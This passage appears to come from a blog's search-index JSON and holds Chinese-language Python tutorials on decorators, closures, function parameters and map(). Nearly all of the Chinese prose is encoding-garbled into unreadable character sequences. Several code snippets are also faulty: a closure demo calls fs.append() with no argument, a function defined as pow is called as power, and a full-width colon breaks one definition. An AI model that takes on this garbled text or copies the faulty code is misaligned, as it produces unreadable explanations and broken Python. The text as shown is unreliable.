ï¼Œä½†æ˜¯ä»–æœ‰ä¸€ä¸ªç¼ºç‚¹å°±æ˜¯åŸå‡½æ•°çš„å…ƒä¿¡æ¯ä¸è§äº†ï¼Œæ¯”å¦‚å‡½æ•°çš„docstringã€__name__ã€å‚æ•°åˆ—è¡¨ï¼Œå…ˆçœ‹ä¾‹å­ï¼š 123456789101112131415def log(text): def decorator(func): def wrapper(*args, **kw): print(&#x27;%s %s():&#x27; % (text, func.__name__)) return func(*args, **kw) return wrapper return decorator@log(&#x27;execute&#x27;)def now(): print(&#x27;2015-3-25&#x27;)now()print(now.__name__) è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 1234execute now():2015-3-25&#x27;wrapper&#x27; å› ä¸ºè¿”å›çš„é‚£ä¸ªwrapper()å‡½æ•°åå­—å°±æ˜¯'wrapper'ï¼Œæ‰€ä»¥ï¼Œéœ€è¦æŠŠåŸå§‹å‡½æ•°çš„__name__ç­‰å±æ€§å¤åˆ¶åˆ°wrapper()å‡½æ•°ä¸­ï¼Œå¦åˆ™ï¼Œæœ‰äº›ä¾èµ–å‡½æ•°ç­¾åçš„ä»£ç æ‰§è¡Œå°±ä¼šå‡ºé”™ã€‚ å¯ä»¥ç›´æ¥ä½¿ç”¨Pythonå†…ç½®çš„functools.wrapså‡½æ•°è§£å†³ä¸Šè¿°é—®é¢˜ã€‚ä¸€ä¸ªå®Œæ•´çš„decoratorå¦‚ä¸‹ï¼š 123456789import functoolsdef log(func): @functools.wraps(func) def wrapper(*args, **kw): print(&#x27;call %s():&#x27; % func.__name__) return func(*args, **kw) return wrapper é’ˆå¯¹å¸¦å‚æ•°çš„è£…é¥°å™¨ï¼š 1234567891011import functoolsdef log(text): def decorator(func): @functools.wraps(func) def wrapper(*args, **kw): print(&#x27;%s %s():&#x27; % (text, func.__name__)) return func(*args, **kw) return wrapper return decorator","tags":[{"name":"python","slug":"python","permalink":"http://ca0y1h.top/tags/python/"},{"name":"å‡½æ•°å¼ç¼–ç¨‹","slug":"å‡½æ•°å¼ç¼–ç¨‹","permalink":"http://ca0y1h.top/tags/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"}],"categories":[{"name":"ç¼–ç¨‹","slug":"ç¼–ç¨‹","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"},{"name":"python","slug":"ç¼–ç¨‹/python","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/python/"}]},{"title":"Pythonå‡½æ•°å¼ç¼–ç¨‹-é—­åŒ…","date":"2019-09-15T03:40:39.000Z","path":"Python/code/3.Pythonå‡½æ•°å¼ç¼–ç¨‹-é—­åŒ…/","text":"Pythonå‡½æ•°å¼ç¼–ç¨‹-é—­åŒ… æ¬è¿è‡ªhttps://serholiu.com/python-closures é¦–å…ˆç»™å‡ºé—­åŒ…çš„ä¸€ç§æµ…æ˜¾çš„å®šä¹‰ï¼ˆå¯èƒ½ä¸å¤Ÿå‡†ç¡®ï¼‰ï¼šè¦å½¢æˆé—­åŒ…ï¼Œé¦–å…ˆå¾—æœ‰ä¸€ä¸ªåµŒå¥—çš„å‡½æ•°ï¼Œå³å‡½æ•°ä¸­å®šä¹‰äº†å¦ä¸€ä¸ªå‡½æ•°ï¼Œé—­åŒ…åˆ™æ˜¯ä¸€ä¸ªé›†åˆï¼Œå®ƒåŒ…æ‹¬äº†å¤–éƒ¨å‡½æ•°çš„å±€éƒ¨å˜é‡ï¼Œè¿™äº›å±€éƒ¨å˜é‡åœ¨å¤–éƒ¨å‡½æ•°è¿”å›åä¹Ÿç»§ç»­å­˜åœ¨ï¼Œå¹¶èƒ½è¢«å†…éƒ¨å‡½æ•°å¼•ç”¨ã€‚ ä¸¾ä¸ªä¾‹å­ å®šä¹‰ä¸€ä¸ªå‡½æ•° generate_power_funcï¼Œå®ƒè¿”å›å¦ä¸€ä¸ªå‡½æ•°ï¼Œç°åœ¨é—­åŒ…å½¢æˆçš„æ¡ä»¶å·²ç»è¾¾åˆ°ã€‚ 123456def generate_power_func(n): print(&#x27;id(n): %X&#x27; % id(n)) def nth_power(x): return x**n print(&#x27;id(nth_power): %X&#x27; % id(nth_power)) return nth_power å¯¹äºå†…éƒ¨å‡½æ•° nth_powerï¼Œå®ƒèƒ½å¼•ç”¨åˆ°å¤–éƒ¨å‡½æ•°çš„å±€éƒ¨å˜é‡ nï¼Œè€Œä¸”å³ä½¿ generate_power_func å·²ç»è¿”å›ã€‚æŠŠè¿™ç§ç°è±¡å°±ç§°ä¸ºé—­åŒ…ã€‚å…·ä½“ä½¿ç”¨ä¸€ä¸‹ã€‚ 12345&gt;&gt;&gt; raised_to_4 = generate_power_func(4)id(n): 7FF968E462F0id(nth_power): 1A5E3415510&gt;&gt;&gt; repr(raised_to_4)&#x27;&lt;function generate_power_func.&lt;locals&gt;.nth_power at 0x000001A5E3415510&gt;&#x27; å¯ä»¥çœ‹å‡ºï¼Œå½“generate_power_func(4)æ‰§è¡Œåï¼Œåˆ›å»ºå¹¶è¿”å›äº†nth_powerè¿™ä¸ªå‡½æ•°å¯¹è±¡ï¼Œå†…å­˜åœ°å€æ˜¯1A5E3415510ï¼Œå¹¶ä¸”å‘ç°raised_to_4å’Œå®ƒçš„å†…å­˜åœ°å€ç›¸åŒï¼Œ**å³raised_to_4**åªæ˜¯è¿™ä¸ªå‡½æ•°å¯¹è±¡çš„ä¸€ä¸ªå¼•ç”¨ã€‚å…ˆåœ¨å…¨å±€å‘½åç©ºé—´ä¸­åˆ é™¤ generate_power_funcï¼Œå†è¯•è¯•ä¼šå‡ºç°ä»€ä¹ˆç»“æœã€‚ 123&gt;&gt;&gt; del generate_power_func&gt;&gt;&gt; raised_to_4(2)16 è¿™å°±æ˜¯é—­åŒ…çš„ä½œç”¨ï¼Œå¤–éƒ¨å‡½æ•°çš„å±€éƒ¨å˜é‡å¯ä»¥è¢«å†…éƒ¨å‡½æ•°å¼•ç”¨ï¼Œå³ä½¿å¤–éƒ¨å‡½æ•°å·²ç»è¿”å›äº†ã€‚ __closure__å±æ€§å’Œcellå¯¹è±¡ é‚£ä¹ˆï¼Œé—­åŒ…åœ¨Pythonå†…éƒ¨åˆ°åº•æ˜¯æ€ä¹ˆå®ç°çš„å‘¢ï¼ŸPython ä¸­å‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡ï¼Œæ‰€ä»¥å‡½æ•°ä¹Ÿæœ‰å¾ˆå¤šå±æ€§ï¼Œå’Œé—­åŒ…ç›¸å…³çš„å°±æ˜¯ __closure__ å±æ€§ã€‚__closure__ å±æ€§å®šä¹‰çš„æ˜¯ä¸€ä¸ªåŒ…å« cell å¯¹è±¡çš„å…ƒç»„ï¼Œå…¶ä¸­å…ƒç»„ä¸­çš„æ¯ä¸€ä¸ª cell å¯¹è±¡ç”¨æ¥ä¿å­˜ä½œç”¨åŸŸä¸­å˜é‡çš„å€¼ã€‚ 12345678&gt;&gt;&gt; raised_to_4.__closure__(&lt;cell at 0x000001A5E320DDC8: int object at 0x00007FF968E462F0&gt;,)&gt;&gt;&gt; type(raised_to_4.__closure__)&lt;class &#x27;tuple&#x27;&gt;&gt;&gt;&gt; type(raised_to_4.__closure__[0])&lt;class &#x27;cell&#x27;&gt;&gt;&gt;&gt; raised_to_4.__closure__[0].cell_contents4 å°±å¦‚åˆšæ‰æ‰€è¯´ï¼Œåœ¨ raised_to_4 çš„ __closure__ å±æ€§ä¸­æœ‰å¤–éƒ¨å‡½æ•°å˜é‡ n çš„å¼•ç”¨ï¼Œé€šè¿‡å†…å­˜åœ°å€å¯ä»¥å‘ç°ï¼Œå¼•ç”¨çš„éƒ½æ˜¯åŒä¸€ä¸ª nã€‚å¦‚æœæ²¡ç”¨å½¢æˆé—­åŒ…ï¼Œåˆ™ __closure__ å±æ€§ä¸º Noneã€‚ Attention ä¸€ä¸ªéœ€è¦æ³¨æ„çš„é—®é¢˜æ˜¯ï¼Œè¿”å›çš„å‡½æ•°å¹¶æ²¡æœ‰ç«‹åˆ»æ‰§è¡Œï¼Œè€Œæ˜¯ç›´åˆ°è°ƒç”¨äº†f()æ‰æ‰§è¡Œã€‚æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼š 123456789def count(): fs = [] for i in range(1, 4): def f(): return i*i fs.append() return fsf1, f2, f3 = count() åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæ¯æ¬¡å¾ªç¯ï¼Œéƒ½åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„å‡½æ•°ï¼Œç„¶åï¼ŒæŠŠåˆ›å»ºçš„3ä¸ªå‡½æ•°éƒ½è¿”å›äº†ã€‚ä½ å¯èƒ½è®¤ä¸ºè°ƒç”¨f1()ï¼Œf2()å’Œf3()ç»“æœåº”è¯¥æ˜¯1ï¼Œ4ï¼Œ9ï¼Œä½†å®é™…ç»“æœæ˜¯ï¼š 123456&gt;&gt;&gt; f1()9&gt;&gt;&gt; f2()9&gt;&gt;&gt; f3()9 å…¨éƒ¨éƒ½æ˜¯9ï¼åŸå› å°±åœ¨äºè¿”å›çš„å‡½æ•°å¼•ç”¨äº†å˜é‡iï¼Œä½†å®ƒå¹¶éç«‹åˆ»æ‰§è¡Œã€‚ç­‰åˆ°3ä¸ªå‡½æ•°éƒ½è¿”å›æ—¶ï¼Œå®ƒä»¬æ‰€å¼•ç”¨çš„å˜é‡iå·²ç»å˜æˆäº†3ï¼Œå› æ­¤æœ€ç»ˆç»“æœä¸º9ã€‚ è¿”å›é—­åŒ…æ—¶ç‰¢è®°ä¸€ç‚¹ï¼šè¿”å›å‡½æ•°ä¸è¦å¼•ç”¨ä»»ä½•å¾ªç¯å˜é‡ï¼Œæˆ–è€…åç»­ä¼šå‘ç”Ÿå˜åŒ–çš„å˜é‡ã€‚ å¦‚æœä¸€å®šè¦å¼•ç”¨å¾ªç¯å˜é‡æ€ä¹ˆåŠï¼Ÿæ–¹æ³•æ˜¯å†åˆ›å»ºä¸€ä¸ªå‡½æ•°ï¼Œç”¨è¯¥å‡½æ•°çš„å‚æ•°ç»‘å®šå¾ªç¯å˜é‡å½“å‰çš„å€¼ï¼Œæ— è®ºè¯¥å¾ªç¯å˜é‡åç»­å¦‚ä½•æ›´æ”¹ï¼Œå·²ç»‘å®šåˆ°å‡½æ•°å‚æ•°çš„å€¼ä¸å˜ï¼š 123456789def count(): def f(j): def g(): return j*j return g fs = [] for i in range(1, 4): fs.append(f(i)) # f(i)ç«‹åˆ»è¢«æ‰§è¡Œï¼Œå› æ­¤içš„å½“å‰å€¼è¢«ä¼ å…¥f() return fs","tags":[{"name":"python","slug":"python","permalink":"http://ca0y1h.top/tags/python/"},{"name":"å‡½æ•°å¼ç¼–ç¨‹","slug":"å‡½æ•°å¼ç¼–ç¨‹","permalink":"http://ca0y1h.top/tags/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"}],"categories":[{"name":"ç¼–ç¨‹","slug":"ç¼–ç¨‹","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"},{"name":"python","slug":"ç¼–ç¨‹/python","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/python/"}]},{"title":"Pythonå‡½æ•°çš„å‚æ•°","date":"2019-09-14T04:28:57.000Z","path":"Python/code/1.Pythonå‡½æ•°çš„å‚æ•°/","text":"Pythonå‡½æ•°çš„å‚æ•° å…³äºPythonçš„å‚æ•°ï¼Œåœ¨å„ç§ä»£ç ä¸­çœ‹åˆ°æœ€å¤šçš„å¯èƒ½å°±æ˜¯def func(*args, **kw)è¿™ç§å‚æ•°ç»„åˆï¼Œè¿™ç¯‡æ–‡ç« å°±æ¥è®¨è®ºæˆ‘ä»¬æ˜¯å¦‚ä½•ä¸€æ­¥ä¸€æ­¥æ¥å¾—åˆ°è¿™æ ·çš„å‚æ•°ç»„åˆã€‚ æ¦‚è¿° Pythonçš„å‡½æ•°å®šä¹‰éå¸¸ç®€å•ï¼Œä½†çµæ´»åº¦å´éå¸¸å¤§ã€‚é™¤äº†æ­£å¸¸å®šä¹‰çš„å¿…é€‰å‚æ•°å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨é»˜è®¤å‚æ•°ã€å¯å˜å‚æ•°å’Œå…³é”®å­—å‚æ•°ï¼Œä½¿å¾—å‡½æ•°å®šä¹‰å‡ºæ¥çš„æ¥å£ï¼Œä¸ä½†èƒ½å¤„ç†å¤æ‚çš„å‚æ•°ï¼Œè¿˜å¯ä»¥ç®€åŒ–è°ƒç”¨è€…çš„ä»£ç ã€‚ ä½ç½®å‚æ•° ä½ç½®å‚æ•°æ˜¯æˆ‘ä»¬æœ€å¸¸è§çš„å‡½æ•°å‚æ•°ï¼Œä¾‹å¦‚ä¸‹é¢å®Œæˆå¹‚è¿ç®—çš„powå‡½æ•°ï¼š 123456def pow(x, n): s = 1 while n &gt; 0: n = n - 1 s = s * x return s pow(x, n)å‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼šxå’Œnï¼Œè¿™ä¸¤ä¸ªå‚æ•°éƒ½æ˜¯ä½ç½®å‚æ•°ï¼Œè°ƒç”¨å‡½æ•°æ—¶ï¼Œä¼ å…¥çš„ä¸¤ä¸ªå€¼æŒ‰ç…§ä½ç½®é¡ºåºä¾æ¬¡èµ‹å€¼ç»™å‚æ•°xå’Œnã€‚ é»˜è®¤å‚æ•° ç”±äºæˆ‘ä»¬ç»å¸¸è®¡ç®—x^2ï¼Œæ‰€ä»¥ï¼Œå®Œå…¨å¯ä»¥æŠŠç¬¬äºŒä¸ªå‚æ•°nçš„é»˜è®¤å€¼è®¾å®šä¸º2ï¼š 123456def pow(x, n=2): s = 1 while n &gt; 0: n = n - 1 s = s * x return s è¿™æ ·ï¼Œæˆ‘ä»¬åœ¨è°ƒç”¨pow(5)æ—¶ï¼Œç›¸å½“äºè°ƒç”¨pow(5, 2)ï¼š 1234&gt;&gt;&gt; power(5)25&gt;&gt;&gt; power(5, 2)25 è®¾ç½®é»˜è®¤å‚æ•°æ—¶ï¼Œæœ‰å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š å¿…é€‰å‚æ•°åœ¨å‰ï¼Œé»˜è®¤å‚æ•°åœ¨åï¼Œå¦åˆ™Pythonç¼–è¯‘å™¨ä¼šæŠ¥é”™ï¼› å½“å‡½æ•°æœ‰å¤šä¸ªå‚æ•°æ—¶ï¼ŒæŠŠå˜åŒ–å¤§çš„å‚æ•°æ”¾å‰é¢ï¼Œå˜åŒ–å°çš„å‚æ•°æ”¾åé¢ã€‚å˜åŒ–å°çš„å‚æ•°å°±å¯ä»¥ä½œä¸ºé»˜è®¤å‚æ•°ã€‚ ä¹Ÿå¯ä»¥ä¸æŒ‰é¡ºåºæä¾›éƒ¨åˆ†é»˜è®¤å‚æ•°ã€‚å½“ä¸æŒ‰é¡ºåºæä¾›éƒ¨åˆ†é»˜è®¤å‚æ•°æ—¶ï¼Œéœ€è¦æŠŠå‚æ•°åå†™ä¸Šã€‚ é»˜è®¤å‚æ•°æœ‰ä¸ªæœ€å¤§çš„å‘ï¼Œå¦‚ä¸‹ï¼š 12345678910&gt;&gt;&gt; def add_end(L=[]):... L.append(&#x27;END&#x27;)... return L... &gt;&gt;&gt; add_end()[&#x27;END&#x27;]&gt;&gt;&gt; add_end()[&#x27;END&#x27;, &#x27;END&#x27;]&gt;&gt;&gt; add_end()[&#x27;END&#x27;, &#x27;END&#x27;, &#x27;END&#x27;] æˆ‘ä»¬å‘ç°ï¼Œæ¯æ¬¡ä½¿ç”¨é»˜è®¤å‚æ•°è°ƒç”¨add_end()å‡½æ•°æ—¶ï¼Œéƒ½ä¼šâ€œè®°ä½â€œä¸Šä¸€æ¬¡è°ƒç”¨çš„ç»“æœã€‚ åŸå› å¦‚ä¸‹ï¼š Pythonå‡½æ•°åœ¨å®šä¹‰çš„æ—¶å€™ï¼Œé»˜è®¤å‚æ•°Lçš„å€¼å°±è¢«è®¡ç®—å‡ºæ¥äº†ï¼Œå³[]ï¼Œå› ä¸ºé»˜è®¤å‚æ•°Lä¹Ÿæ˜¯ä¸€ä¸ªå˜é‡ï¼Œå®ƒæŒ‡å‘å¯¹è±¡[]ï¼Œæ¯æ¬¡è°ƒç”¨è¯¥å‡½æ•°ï¼Œå¦‚æœæ”¹å˜äº†Lçš„å†…å®¹ï¼Œåˆ™ä¸‹æ¬¡è°ƒç”¨æ—¶ï¼Œé»˜è®¤å‚æ•°çš„å†…å®¹å°±å˜äº†ï¼Œä¸å†æ˜¯å‡½æ•°å®šä¹‰æ—¶çš„[]äº†ã€‚ æ‰€ä»¥ï¼Œé»˜è®¤å‚æ•°å¿…é¡»æŒ‡å‘ä¸å¯å˜å¯¹è±¡ï¼ï¼ï¼ ä¸Šé¢çš„ä¾‹å­ä¿®æ”¹å¦‚ä¸‹ï¼š 12345def add_end(L=None)ï¼š if L == None: L = [] L.append(&#x27;END&#x27;) return L å¯å˜å‚æ•° ä»¥æ•°å­¦é¢˜ä¸ºä¾‹å­ï¼Œç»™å®šä¸€ç»„æ•°å­—aï¼Œbï¼Œcâ€¦â€¦ï¼Œè¯·è®¡ç®—a^2 + b^2 + c^2 + â€¦â€¦ï¼Œç”±äºå‚æ•°ä¸ç¡®å®šï¼Œé¦–å…ˆæƒ³åˆ°å¯ä»¥æŠŠaï¼Œbï¼Œcâ€¦ä½œä¸ºä¸€ä¸ªlistæˆ–è€…tupleä¼ è¿›æ¥ã€‚ 12345def calc(numbers): sum = 0 for n in numbers: sum = sum + n * n return sum åœ¨ä¼ å‚æ—¶å°±éœ€è¦å…ˆç»„è£…ä¸€ä¸ªtupleæˆ–listï¼š 1234&gt;&gt;&gt; calc([1, 2, 3])14&gt;&gt;&gt; calc((1, 3, 5, 7))84 å¦‚æœä½¿ç”¨å¯å˜å‚æ•°ï¼š 12345def calc(*numbers): sum = 0 for n in numbers: sum = sum + n * n return sum åœ¨å‡½æ•°å†…éƒ¨ï¼Œå‚æ•°numbersæ¥æ”¶åˆ°çš„æ˜¯ä¸€ä¸ªtupleï¼Œå› æ­¤ï¼Œå‡½æ•°ä»£ç å®Œå…¨ä¸å˜ã€‚ä½†æ˜¯ï¼Œè°ƒç”¨è¯¥å‡½æ•°æ—¶ï¼Œå¯ä»¥ä¼ å…¥ä»»æ„ä¸ªå‚æ•°ï¼ŒåŒ…æ‹¬0ä¸ªå‚æ•°ï¼š 12345&gt;&gt;&gt; calc(1, 2)5&gt;&gt;&gt; calc()0 å¦‚æœå·²ç»æœ‰ä¸€ä¸ªlistæˆ–tupleï¼Œä¼ å‚æ—¶å¯ä»¥ä½¿ç”¨*æ¥å¯¹å…¶è¿›è¡Œè§£åŒ…æ“ä½œï¼š 1234&gt;&gt;&gt; nums = [1, 2, 3]&gt;&gt;&gt; calc(*nums)14 *numsè¡¨ç¤ºæŠŠnumsè¿™ä¸ªlistçš„æ‰€æœ‰å…ƒç´ ä½œä¸ºå¯å˜å‚æ•°ä¼ è¿›å»ã€‚ å…³é”®å­—å‚æ•° å…³é”®å­—å‚æ•°å…è®¸ä½ ä¼ å…¥0ä¸ªæˆ–ä»»æ„ä¸ªå«å‚æ•°åçš„å‚æ•°ï¼Œè¿™äº›å…³é”®å­—å‚æ•°åœ¨å‡½æ•°å†…éƒ¨è‡ªåŠ¨ç»„è£…ä¸ºä¸€ä¸ªdictã€‚ä¾‹å¦‚ï¼š 123def person(name, age, **kw): print(&#x27;name:&#x27;, name, &#x27;age:&#x27;, age, &#x27;other:&#x27;, kw) åœ¨è°ƒç”¨è¯¥å‡½æ•°æ—¶ï¼Œå¯ä»¥åªä¼ å…¥å¿…é€‰å‚æ•°ï¼š 123&gt;&gt;&gt; person(&#x27;Colin&#x27;, 24)name: Colin age: 24 other: &#123;&#125; ä¹Ÿå¯ä»¥ä¼ å…¥ä»»æ„ä¸ªæ•°çš„å…³é”®å­—å‚æ•°ï¼š 12345&gt;&gt;&gt; person(&#x27;Bob&#x27;, 35, city=&#x27;Beijing&#x27;)name: Bob age: 35 other: &#123;&#x27;city&#x27;: &#x27;Beijing&#x27;&#125;&gt;&gt;&gt; person(&#x27;Adam&#x27;, 45, gender=&#x27;M&#x27;, job=&#x27;Engineer&#x27;)name: Adam age: 45 other: &#123;&#x27;gender&#x27;: &#x27;M&#x27;, &#x27;job&#x27;: &#x27;Engineer&#x27;&#125; å…³é”®å­—å‚æ•°å¯ä»¥æ‰©å±•å‡½æ•°åŠŸèƒ½ï¼Œä¾‹å¦‚ï¼šæ­£åœ¨åšä¸€ä¸ªç”¨æˆ·æ³¨å†Œçš„åŠŸèƒ½ï¼Œé™¤äº†ç”¨æˆ·åå’Œå¹´é¾„æ˜¯å¿…å¡«é¡¹å¤–ï¼Œå…¶ä»–éƒ½æ˜¯å¯é€‰é¡¹ï¼Œåˆ©ç”¨å…³é”®å­—å‚æ•°æ¥å®šä¹‰è¿™ä¸ªå‡½æ•°å°±èƒ½æ»¡è¶³æ³¨å†Œçš„éœ€æ±‚ã€‚ å’Œå¯å˜å‚æ•°ç±»ä¼¼ï¼Œå¯ä»¥å…ˆç»„è£…å‡ºä¸€ä¸ªdictï¼Œå†æŠŠè¯¥dictè½¬æ¢ä¸ºå…³é”®å­—å‚æ•°ä¼ è¿›å»ï¼š 1234&gt;&gt;&gt; extra = &#123;&#x27;city&#x27;: &#x27;Beijing&#x27;, &#x27;job&#x27;: &#x27;Engineer&#x27;&#125;&gt;&gt;&gt; person(&#x27;Jack&#x27;, 24, city=extra[&#x27;city&#x27;], job=extra[&#x27;job&#x27;])name: Jack age: 24 other: &#123;&#x27;city&#x27;: &#x27;Beijing&#x27;, &#x27;job&#x27;: &#x27;Engineer&#x27;&#125; å¯ä»¥ç®€åŒ–ä¸ºï¼š 123&gt;&gt;&gt; extra = &#123;&#x27;city&#x27;: &#x27;Beijing&#x27;, &#x27;job&#x27;: &#x27;Engineer&#x27;&#125;&gt;&gt;&gt; person(&#x27;Jack&#x27;, 24, **extra) **extraè¡¨ç¤ºæŠŠextraè¿™ä¸ªdictçš„æ‰€æœ‰key-valueç”¨å…³é”®å­—å‚æ•°ä¼ å…¥åˆ°å‡½æ•°çš„**kwå‚æ•°ï¼Œkwå°†è·å¾—ä¸€ä¸ªdictï¼Œæ³¨æ„kwè·å¾—çš„dictæ˜¯extraçš„ä¸€ä»½æ‹·è´ï¼Œå¯¹kwçš„æ”¹åŠ¨ä¸ä¼šå½±å“åˆ°å‡½æ•°å¤–çš„extraã€‚ å‘½ä»¤å…³é”®å­—å‚æ•° å¯¹äºå…³é”®å­—å‚æ•°ï¼Œå‡½æ•°çš„è°ƒç”¨è€…å¯ä»¥ä¼ å…¥ä»»æ„ä¸å—é™åˆ¶çš„å…³é”®å­—å‚æ•°ã€‚å¦‚æœè¦é™åˆ¶å…³é”®å­—å‚æ•°çš„åå­—ï¼Œå¯ä»¥ç”¨å‘½åå…³é”®å­—å‚æ•°ã€‚ä¾‹å¦‚åªæ¥æ”¶cityå’Œjobä½œä¸ºå…³é”®å­—å‚æ•°ï¼š 123def person(name, age, *, city, job): print(name, age, city, job) å’Œå…³é”®å­—å‚æ•°**kwä¸åŒï¼Œå‘½åå…³é”®å­—å‚æ•°éœ€è¦ä¸€ä¸ªç‰¹æ®Šåˆ†éš”ç¬¦*ï¼Œ*åé¢çš„å‚æ•°è¢«è§†ä¸ºå‘½åå…³é”®å­—å‚æ•°ã€‚ è°ƒç”¨æ–¹å¼å¦‚ä¸‹ï¼š 123&gt;&gt;&gt; person(&#x27;Jack&#x27;, 24, city=&#x27;Beijing&#x27;, job=&#x27;Engineer&#x27;)Jack 24 Beijing Engineer å¦‚æœå‚æ•°ä¸­å·²ç»æœ‰ä¸€ä¸ªå¯å˜å‚æ•°ï¼Œåé¢è·Ÿç€çš„å‘½ä»¤å…³é”®å­—å‚æ•°å°±ä¸éœ€è¦åˆ†éš”ç¬¦*ï¼š 123def person(name, age, *args, city, job): print(name, age, args, city, job) å‘½åå…³é”®å­—å‚æ•°å¿…é¡»ä¼ å…¥å‚æ•°åï¼Œè¿™å’Œä½ç½®å‚æ•°ä¸åŒã€‚ å‚æ•°ç»„åˆ å‚æ•°å®šä¹‰çš„é¡ºåºå¿…é¡»æ˜¯ï¼šå¿…é€‰å‚æ•°ã€é»˜è®¤å‚æ•°ã€å¯å˜å‚æ•°ã€å‘½åå…³é”®å­—å‚æ•°å’Œå…³é”®å­—å‚æ•°ã€‚ä¾‹å¦‚ï¼š 123456&gt;&gt;&gt; def f1(a, b ,c=0, *args, **kw):... print(&#x27;a =&#x27;, a, &#x27;b =&#x27;, b, &#x27;c =&#x27;, c, &#x27;args =&#x27;, args, &#x27;kw =&#x27;, kw)... &gt;&gt;&gt; def f2(a, b, c=0, *, d, **kw):... print(&#x27;a =&#x27;, a, &#x27;b =&#x27;, b, &#x27;c =&#x27;, c, &#x27;d =&#x27;, d, &#x27;kw =&#x27;, kw) å‡½æ•°è°ƒç”¨å¦‚ä¸‹ï¼š 12345678910111213&gt;&gt;&gt; f1(1,2)a = 1 b = 2 c = 0 args = () kw = &#123;&#125;&gt;&gt;&gt; f1(1,2,c=3)a = 1 b = 2 c = 3 args = () kw = &#123;&#125;&gt;&gt;&gt; f1(1,2,3)a = 1 b = 2 c = 3 args = () kw = &#123;&#125;&gt;&gt;&gt; f1(1,2,3,&#x27;a&#x27;,&#x27;b&#x27;)a = 1 b = 2 c = 3 args = (&#x27;a&#x27;, &#x27;b&#x27;) kw = &#123;&#125;&gt;&gt;&gt; f1(1,2,3,&#x27;a&#x27;,&#x27;b&#x27;,x=99)a = 1 b = 2 c = 3 args = (&#x27;a&#x27;, &#x27;b&#x27;) kw = &#123;&#x27;x&#x27;: 99&#125;&gt;&gt;&gt; f2(1,2,d=99,ext=None)a = 1 b = 2 c = 0 d = 99 kw = &#123;&#x27;ext&#x27;: None&#125; è¿˜å¯ä»¥ç”¨ä¸€ä¸ªtupleå’Œdictè°ƒç”¨ä¸Šè¿°å‡½æ•°ï¼š 123456789&gt;&gt;&gt; args = (1,2,3,4)&gt;&gt;&gt; kw = &#123;&#x27;d&#x27;: 99, &#x27;x&#x27;: &#x27;#&#x27;&#125;&gt;&gt;&gt; f1(*args, **kw)a = 1 b = 2 c = 3 args = (4,) kw = &#123;&#x27;d&#x27;: 99, &#x27;x&#x27;: &#x27;#&#x27;&#125;&gt;&gt;&gt; args = (1, 2, 3)&gt;&gt;&gt; kw = &#123;&#x27;d&#x27;:88, &#x27;x&#x27;:&#x27;#&#x27;&#125;&gt;&gt;&gt; f2(*args, **kw)a = 1 b = 2 c = 3 d = 88 kw = &#123;&#x27;x&#x27;: &#x27;#&#x27;&#125; æ€»ç»“ *argsæ˜¯å¯å˜å‚æ•°ï¼Œargsæ¥æ”¶ä¸€ä¸ªtupleï¼› **kwæ˜¯å…³é”®å­—å‚æ•°ï¼Œkwæ¥æ”¶ä¸€ä¸ªdictï¼› å¯å˜å‚æ•°æ—¢å¯ä»¥ç›´æ¥ä¼ å…¥ï¼šfunc(1, 2, 3)ï¼Œè¿˜å¯ä»¥ç»„è£…æˆä¸€ä¸ªlistæˆ–tupleä¼ å…¥ï¼šfunc(*(1, 2, 3))ï¼› å…³é”®å­—å‚æ•°æ—¢å¯ä»¥ç›´æ¥ä¼ å…¥ï¼šfunc(a=1, b=2)ï¼Œè¿˜å¯ä»¥ç»„è£…æˆä¸€ä¸ªdictä¼ å…¥ï¼šfunc(**&#123;'a': 1, 'b': 2&#125;)ï¼› å‘½åå…³é”®å­—å‚æ•°æ˜¯ä¸ºäº†é™åˆ¶è°ƒç”¨è€…å¯ä»¥ä¼ å…¥çš„å‚æ•°åï¼ŒåŒæ—¶å¯ä»¥æä¾›é»˜è®¤å€¼ï¼›","tags":[{"name":"python","slug":"python","permalink":"http://ca0y1h.top/tags/python/"}],"categories":[{"name":"ç¼–ç¨‹","slug":"ç¼–ç¨‹","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/"},{"name":"python","slug":"ç¼–ç¨‹/python","permalink":"http://ca0y1h.top/categories/%E7%BC%96%E7%A8%8B/python/"}]},{"title":"Pythonå‡½æ•°å¼ç¼–ç¨‹ä¹‹é«˜é˜¶å‡½æ•°","date":"2019-09-11T12:33:15.000Z","path":"Python/code/2.Pythonå‡½æ•°å¼ç¼–ç¨‹ä¹‹é«˜é˜¶å‡½æ•°/","text":"Pythonå‡½æ•°å¼ç¼–ç¨‹ä¹‹é«˜é˜¶å‡½æ•° ä»Šå¤©æˆ‘ä»¬å°±æ¥çœ‹å‡ ä¸ªPythonçš„é«˜çº§å‡½æ•°ï¼šMapï¼ŒReduceï¼ŒFilterï¼ŒSortedã€‚ Map Function Definition map()å‡½æ•°æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯å‡½æ•°ï¼Œä¸€ä¸ªæ˜¯Iterableï¼Œmapå°†ä¼ å…¥çš„å‡½æ•°ä¾æ¬¡ä½œç”¨åˆ°åºåˆ—çš„æ¯ä¸ªå…ƒç´ ï¼Œå¹¶æŠŠç»“æœä½œä¸ºæ–°çš„Iterableè¿”å›ã€‚ Example 1234567891011&gt;&gt;&gt; def f(x):... return x*x... &gt;&gt;&gt; r = map(f, [1,2,3,4,5,6,7,8,9,10])&gt;&gt;&gt; r&lt;map object at 0x0000020AAF4C1668&gt;&gt;&gt;&gt; list(r)[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]&gt;&gt;&gt;&gt;&gt;&gt; list(map(str, [1,2,3,4,5,6,7,8,9,10]))[&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, 